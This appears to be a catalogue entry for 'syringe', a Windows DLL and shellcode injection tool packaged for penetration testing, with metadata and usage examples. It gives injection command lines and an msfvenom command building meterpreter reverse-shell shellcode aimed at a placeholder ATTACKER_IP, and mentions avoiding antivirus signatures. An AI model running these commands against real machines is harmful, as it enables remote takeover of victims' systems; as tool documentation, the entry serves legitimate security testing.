---
name: "syringe"
categories:
  - blackarch-backdoor
version: "12.79a703e"
homepage: "https://github.com/securestate/syringe"
packaged-by: [blackarch]
blackarch-builddate: "2024-10-18"
build-system: scripts
license: GPL3
meta-checked: "2026-11-09"
github-repo: "securestate/syringe"
github-stars: 156
github-pushed: "2018-01-27"
github-archived: false
github-issues: 0
github-match: "exact"
gh-checked: "2026-11-07"
worth: 2.5
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# syringe

> General-purpose DLL and code injection utility for 32- and 64-bit Windows: inject a DLL into a PID, inject shellcode into a PID, or self-inject shellcode.

## What it's for

Syringe (SecureState) is a general-purpose DLL and shellcode injection utility for 32- and 64-bit Windows with exactly three modes: DLL injection into a process by PID, shellcode injection into a process by PID, and shellcode injection into itself. It is distributed in source form only (Visual Studio 2013 project), a deliberate choice to keep AV vendors from signatureing a shipped binary. Shellcode must be base64-encoded raw bytes — the README's reference pipeline is msfvenom piped through `base64`. The project has been dormant since 2018; against modern EDR it is a teaching/reference implementation of classic injection rather than a viable implant dropper, but the three-mode CLI remains a clean minimal example of the technique. The note frontmatter previously recorded GPL3; the repository LICENSE is BSD 3-clause.

No corpus evidence — derived from upstream documentation.

## Typical use cases

### Inject a DLL into a running process

Load an arbitrary library into a live process.

```
syringe.x86.exe -1 payload.dll 1337
```

Outcome: payload.dll is mapped into the process with PID 1337 and its DllMain executes inside the target (use `syringe.x64.exe` for a 64-bit process).

### Inject base64 shellcode into a target process

Run position-independent code inside another process.

```
syringe.x86.exe -2 shellcode.b64 1337
```

Outcome: the base64 shellcode is decoded and injected into PID 1337 — the classic route for executing a meterpreter stage in a host process.

### Self-inject shellcode

Skip the target PID by using syringe's own process.

```
syringe.x86.exe -3 shellcode.b64
```

Outcome: the shellcode is injected into the syringe process itself, no PID needed — suitable when spawning a sacrificial process for the payload is acceptable.

### Produce shellcode in the format syringe expects

Prepare input for the `-2`/`-3` modes.

```
sudo msfvenom -p windows/x64/meterpreter/reverse_https -t raw LHOST=ATTACKER_IP LPORT=443 ExitFunc=thread | base64 | awk 1 ORS=''
```

Outcome: raw x64 meterpreter shellcode is emitted as a single-line base64 string on stdout — save it to a file and pass that file to syringe; adjust `-p` (x86 vs x64 payload) and LHOST/LPORT for your target and architecture.
